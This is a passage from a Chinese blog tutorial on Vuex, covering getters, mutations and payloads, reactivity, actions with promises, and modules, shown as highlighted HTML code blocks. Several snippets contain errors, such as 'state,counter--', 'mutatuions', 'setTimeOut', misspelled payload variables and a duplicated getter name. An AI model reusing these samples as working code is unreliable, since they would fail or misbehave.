class="line">        <span class="keyword">return</span> state.<span class="property">counter</span> * state.<span class="property">counter</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在app的template使用计算属性  因为是计算属性 所以可以不用加括号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;原来的方法：&#123;&#123;$store.state.counter * $store.state.counter&#125;&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;使用getters:&#123;&#123;$store.getters.powCounter&#125;&#125;&lt;/h3&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>如果要使用对象中的某一个筛选对象，例如学生中选年龄大于12岁的,加学生个数，传入年龄 选出年龄大的学生</p></li></ol><ul><li><pre><code class="language-js">// index.js state: &#123;        //保存状态        counter: 1000,        students: [            &#123; id: 111, name: 'why1', age: 11 &#125;,            &#123; id: 112, name: 'why2', age: 12 &#125;,            &#123; id: 113, name: 'why3', age: 13 &#125;,            &#123; id: 114, name: 'why4', age: 14 &#125;,        ]    &#125;,<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ &gt; 使用计算属性</span><br><span class="line">  &gt;</span><br><span class="line">  &gt; ~~~vue</span><br><span class="line">  &gt; &lt;template&gt;</span><br><span class="line">  &gt; &lt;h3&gt;&#123;&#123;more12stu&#125;&#125;&lt;/h3&gt;</span><br><span class="line">  &gt; &lt;/template&gt;</span><br><span class="line">  &gt; &lt;script&gt;</span><br><span class="line">  &gt; computed: &#123;</span><br><span class="line">  &gt;  more12stu() &#123;</span><br><span class="line">  &gt;  return this.$store.state.students.filter((s) =&gt; s.age &gt; 12);</span><br><span class="line">  &gt;  &#125;,</span><br><span class="line">  &gt; &#125;,</span><br><span class="line">  &gt; &lt;/script&gt;</span><br></pre></td></tr></table></figure>&gt;&gt; 要是别的页面要用就得复制过去，很麻烦</code></pre></li><li><p>使用getters</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js </span></span><br><span class="line"><span class="attr">getters</span>: &#123;</span><br><span class="line">        <span class="comment">//大于12的学生</span></span><br><span class="line">        <span class="title function_">more12stu</span>(<span class="params">state</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> state.<span class="property">students</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">s</span> =&gt;</span> s.<span class="property">age</span> &gt; <span class="number">12</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//大于12的学生的个数</span></span><br><span class="line">        <span class="title function_">more12stuLength</span>(<span class="params">state,getters</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> getters.<span class="property">more12stu</span>.<span class="property">length</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//大于age的学生</span></span><br><span class="line">        <span class="title function_">moreAgestu</span>(<span class="params">state</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="function"><span class="params">age</span> =&gt;</span> state.<span class="property">students</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">s</span> =&gt;</span> s.<span class="property">age</span> &gt; age)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure></li><li><p>使用getters的数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vue</span></span><br><span class="line">&lt;h3&gt;年龄大于<span class="number">20</span>的学生：&#123;&#123; $store.<span class="property">getters</span>.<span class="property">more12stu</span> &#125;&#125;&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//大于12的学生的个数 可以直接 写length</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; $store.getters.more12stu.length &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="comment">//也可以再写一个计算属性</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; $store.getters.more12stuLength &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//年龄大于age的学生</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; $store.getters.moreAgestu(11) &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li></ul><h3 id="3.3-mutation">3.3 Mutation<a title="#3.3-mutation" href="#3.3-mutation"></a></h3><blockquote><p>相当于methods</p></blockquote><ul><li><p>vuex的store状态的更新唯一方式：commit mutation</p></li><li><p>mutation包括两个部分：</p><ul><li>字符串的事件类型type <code>increment</code></li><li>一个回调函数handler，该回调函数的第一个参数是state<code>(state)&#123;state.couter--&#125;</code></li></ul></li><li><p>mutation的定义方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="attr">mutatuions</span>:&#123;</span><br><span class="line">    <span class="title function_">increment</span>(<span class="params">state</span>)&#123;</span><br><span class="line">        state,counter--</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>mutation的更新：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vue</span></span><br><span class="line"><span class="attr">add</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;increment&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="3.3.2-传入参数">3.3.2 传入参数<a title="#3.3.2-传入参数" href="#3.3.2-传入参数"></a></h4><p><strong>参数被称为mutation的载荷Payload</strong></p><p>点击＋任意数量   添加学生</p><ul><li><pre><code class="language-vue">//vue&lt;button @click='addcount(5)'&gt;+5&lt;/button&gt;&lt;button @click=&quot;addstu&quot;&gt;添加学生&lt;/button&gt;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 写方法</span><br><span class="line"></span><br><span class="line">  ~~~js</span><br><span class="line">  //vue</span><br><span class="line">  methods:&#123;</span><br><span class="line">      addcount(count)&#123;</span><br><span class="line">          return this.$store.commit(&#x27;incrementcount&#x27;,count);</span><br><span class="line">      &#125;,</span><br><span class="line">      addstu() &#123;</span><br><span class="line">      const stu = &#123; id: 115, name: &quot;why5&quot;, age: 15 &#125;;</span><br><span class="line">  return this.$store.commit(&quot;addstu&quot;, stu);</span><br><span class="line">  &#125;,</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></code></pre></li><li><p>mutation</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="attr">mutations</span>:&#123;</span><br><span class="line">    <span class="title function_">incrementcount</span>(<span class="params">state,count</span>)&#123;</span><br><span class="line">        state.<span class="property">counter</span> += count;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">addstu</span>(<span class="params">state, stu</span>) &#123;</span><br><span class="line">        state.<span class="property">students</span>.<span class="title function_">push</span>(stu)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="3.3.3-mutation的提交风格">3.3.3 mutation的提交风格<a title="#3.3.3-mutation的提交风格" href="#3.3.3-mutation的提交风格"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vue methods</span></span><br><span class="line"><span class="title function_">addcount</span>(<span class="params">count</span>) &#123;</span><br><span class="line"><span class="comment">//1. 普通提交方式</span></span><br><span class="line"> <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&quot;incrementcount&quot;</span>, count);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//2.特殊的封装方式</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(&#123;</span><br><span class="line"><span class="attr">type</span>: <span class="string">&quot;incrementcount&quot;</span>,</span><br><span class="line">count,</span><br><span class="line">&#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js mutation </span></span><br><span class="line"><span class="title function_">incrementcount</span>(<span class="params">state, count</span>) &#123;</span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(count);</span><br><span class="line">       <span class="comment">// 如果是普通提交 返回的是 count的数值</span></span><br><span class="line">       <span class="comment">// 如果是封装的提交 返回的是整个参数对象  </span></span><br><span class="line">       <span class="comment">// 这里就应该使用 payload参数命名 然后使用layload.count</span></span><br><span class="line">       state.<span class="property">counter</span> += count</span><br><span class="line">&#125;,</span><br><span class="line">==&gt;</span><br><span class="line"><span class="title function_">incrementcount</span>(<span class="params">state,layload</span>)&#123;</span><br><span class="line">    state.<span class="property">counter</span> += layload.<span class="property">count</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3.3.4-vuex数据响应式原理(对组件也是一个道理)">3.3.4 vuex数据响应式原理(对组件也是一个道理)<a title="#3.3.4-vuex数据响应式原理(对组件也是一个道理)" href="#3.3.4-vuex数据响应式原理(对组件也是一个道理)"></a></h4><img src='https://s1.328888.xyz/2022/04/09/XawBt.jpg' style="zoom:50%;" ><p>在里面的定义的每个属性 都会有一个Dep[watcher…]  watcher会监听每一个页面的属性变化</p><h5 id="3.3.4.1在mutations增加删除数据事如何做到响应式">3.3.4.1在mutations增加删除数据事如何做到响应式<a title="#3.3.4.1在mutations增加删除数据事如何做到响应式" href="#3.3.4.1在mutations增加删除数据事如何做到响应式"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mutations</span>:&#123;</span><br><span class="line">    <span class="title function_">updateInfo</span>(<span class="params">state</span>)&#123;</span><br><span class="line">        <span class="comment">//这样无法响应式 就是代码改了 无法在页面改 因为没有监听</span></span><br><span class="line">        state.<span class="property">info</span>[<span class="string">&#x27;address&#x27;</span>] = <span class="string">&#x27;china&#x27;</span>;</span><br><span class="line">        <span class="comment">//使用Vue.set方法就可以</span></span><br><span class="line">        <span class="title class_">Vue</span>.<span class="title function_">set</span>(state.<span class="property">info</span> , <span class="string">&#x27;address&#x27;</span> , <span class="string">&#x27;china&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//删除数据时 使用delete删除无法响应式</span></span><br><span class="line">        <span class="keyword">delete</span> state.<span class="property">info</span>.<span class="property">age</span>;</span><br><span class="line">        <span class="comment">//使用Vue.delete可以</span></span><br><span class="line">        <span class="title class_">Vue</span>.<span class="title function_">delete</span>(state.<span class="property">info</span> , <span class="string">&#x27;age&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3.3.5-mutation常量类型">3.3.5 mutation常量类型<a title="#3.3.5-mutation常量类型" href="#3.3.5-mutation常量类型"></a></h4><p>把vue里面methods里面commit括号里的”increment“，和index.js里mutations里的increment变成一个常量，这样不会写错</p><ol><li><p>在store文件夹下面 新建 <code>mutations.types.js</code> 用来导出常量</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mutations.types.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">INCREMENT</span> = <span class="string">&quot;increment&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>导入文件，修改vue里的”increment“</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">INCREMENT</span> &#125; <span class="keyword">from</span> <span class="string">&quot;../store/mutations.types&quot;</span>;</span><br><span class="line"><span class="title function_">add</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="variable constant_">INCREMENT</span>);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p>导入文件，修改index.js的increment</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">INCREMENT</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./mutations.types&#x27;</span></span><br><span class="line">[<span class="variable constant_">INCREMENT</span>](state) &#123;</span><br><span class="line">            state.<span class="property">counter</span>++;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li></ol><h3 id="3.4-action">3.4 Action<a title="#3.4-action" href="#3.4-action"></a></h3><blockquote><p>相当于异步methods</p></blockquote><p>在mutations中进行异步操作，devtools插件没有办法追踪到变化，页面变化，但是控制台的代码没有变</p><p>所以用actions替代mutations</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="attr">mutations</span>:&#123;</span><br><span class="line">    <span class="title function_">updateInfo</span>(<span class="params">state</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> state.<span class="property">info</span>.<span class="property">name</span> = <span class="string">&#x27;why&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attr">actions</span>:&#123;</span><br><span class="line">    <span class="comment">//context:上下文  可看成state 不能跳过mutations</span></span><br><span class="line">    <span class="comment">//传参数</span></span><br><span class="line">    <span class="title function_">aUpdateInfo</span>(<span class="params">context,payload</span>)&#123;</span><br><span class="line">        <span class="title function_">setTimeOut</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            context.<span class="title function_">commit</span>(<span class="string">&#x27;updateInfo&#x27;</span>,payload); </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(paylog);</span><br><span class="line">        &#125;,<span class="number">1000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在vue中操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;button @click=<span class="string">&quot;updateInfo&quot;</span>&gt;更新&lt;/button&gt;</span><br><span class="line"></span><br><span class="line"><span class="title function_">updateInfo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//this.$store.commit(&#x27;updateInfo&#x27;);  //不会改代码</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispatch</span>(<span class="string">&#x27;aUpdateInfo&#x27;</span>,<span class="string">&#x27;我是payload&#x27;</span>);  <span class="comment">//这样才会经过actions mutations 然后被插件检测到</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在修改成功的时候通知用户</strong></p><p>一般在commit的地方就修改成功了</p><ul><li><p>正常写法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vue</span></span><br><span class="line"><span class="title function_">updateInfo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//this.$store.dispatch(&#x27;aUpdateInfo&#x27;,()=&gt;&#123;</span></span><br><span class="line">    <span class="comment">//    console.log(&quot;修改成功&quot;);</span></span><br><span class="line">    <span class="comment">//&#125;)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispatch</span>(<span class="string">&#x27;aUpdateInfo&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">message</span>:<span class="string">&quot;我是携带信息&quot;</span>,</span><br><span class="line">        <span class="attr">success</span>:<span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="attr">actions</span>:&#123;</span><br><span class="line">    <span class="title function_">aUpdateInfo</span>(<span class="params">context,payload</span>)&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            context.<span class="title function_">commit</span>(<span class="string">&#x27;updateInfo&#x27;</span>);  <span class="comment">//一般在这会修改成功</span></span><br><span class="line">            <span class="comment">//payload()</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(layload.<span class="property">message</span>);</span><br><span class="line">            payload.<span class="title function_">success</span>();</span><br><span class="line">        &#125;,<span class="number">1000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>优雅的写法 使用promise</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vue</span></span><br><span class="line"><span class="title function_">updateInfo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$store</span></span><br><span class="line">    .<span class="title function_">dispatch</span>(<span class="string">&quot;aUpdateInfo&quot;</span>)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="title function_">aUpdateInfo</span>(<span class="params">context,payload</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            context.<span class="title function_">commit</span>(<span class="string">&#x27;updateInfo&#x27;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(payload);</span><br><span class="line">            <span class="title function_">resolve</span>(<span class="number">111</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="3.5-module">3.5 Module<a title="#3.5-module" href="#3.5-module"></a></h3><ul><li>因为vue使用单一状态树意味着很多状态都给vuex来管理</li><li>当应该很复杂时store就很臃肿</li><li>所以vuex允许我们将store分割城模块，每个模块拥有自己的state、mutations、actions、getters</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="keyword">const</span> moduleA = &#123;</span><br><span class="line">    <span class="attr">state</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;lisi&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">mutations</span>: &#123;</span><br><span class="line">        <span class="title function_">updatelisi</span>(<span class="params">state.payload</span>)&#123;</span><br><span class="line">            state.<span class="property">name</span>=payload;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">actions</span>: &#123;</span><br><span class="line">        <span class="title function_">aupdatelisi</span>(<span class="params">context</span>) &#123;</span><br><span class="line">            <span class="comment">//这里commit的是上面部分的mutations</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(context);<span class="comment">//有根的各种东西</span></span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                context.<span class="title function_">commit</span>(<span class="string">&#x27;updatelisi&#x27;</span>, <span class="string">&#x27;wangwu&#x27;</span>);</span><br><span class="line">            &#125;, <span class="number">1000</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getters</span>: &#123;</span><br><span class="line">        <span class="title function_">fullname</span>(<span class="params">state</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> state.<span class="property">name</span> + <span class="string">&#x27; getters&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">fullname</span>(<span class="params">state, getters ,rootState</span>)&#123;</span><br><span class="line">            <span class="comment">//rootState 根的state</span></span><br><span class="line">            <span class="keyword">return</span> getters.<span class="property">fullname</span> + rootState.<span class="property">counter</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="attr">modules</span>: &#123;</span><br><span class="line">        <span class="attr">a</span>: moduleA</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//vue使用</span></span><br><span class="line">&lt;h3 style=<span class="string">&quot;color: red&quot;</span>&gt;&#123;&#123; $store.<span class="property">state</span>.<span class="property">a</span>.<span class="property">name</span> &#125;&#125;&lt;/h3&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">style</span>=<span class="string">&quot;color: red&quot;</span>&gt;</span>&#123;&#123; $store.getters.fullname &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">style</span>=<span class="string">&quot;color: red&quot;</span>&gt;</span>&#123;&#123; $store.getters.fullname2 &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;change&quot;</span>&gt;</span>改名<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;asyncChange&quot;</span>&gt;</span>异步改名<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="title function_">change</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;updatelisi&#x27;</span>,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="title function_">asyncChange</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispatch</span>(<span class="string">&quot;aupdatelisi&quot;</span>);</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3.6-actions的写法-对象的解构">3.6 actions的写法 对象的解构<a title="#3.6-actions的写法-对象的解构" href="#3.6-actions的写法-对象的解构"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">actions</span>:&#123;</span><br><span class="line">    <span class="title function_">add</span>(<span class="params">context</span>)&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//也可以写成</span></span><br><span class="line">    <span class="title function_">add</span>(<span class="params">&#123;state,commit,rootState&#125;</span>)&#123;</span><br><span class="line">       ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解构：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;11&#x27;</span>,</span><br><span class="line">    <span 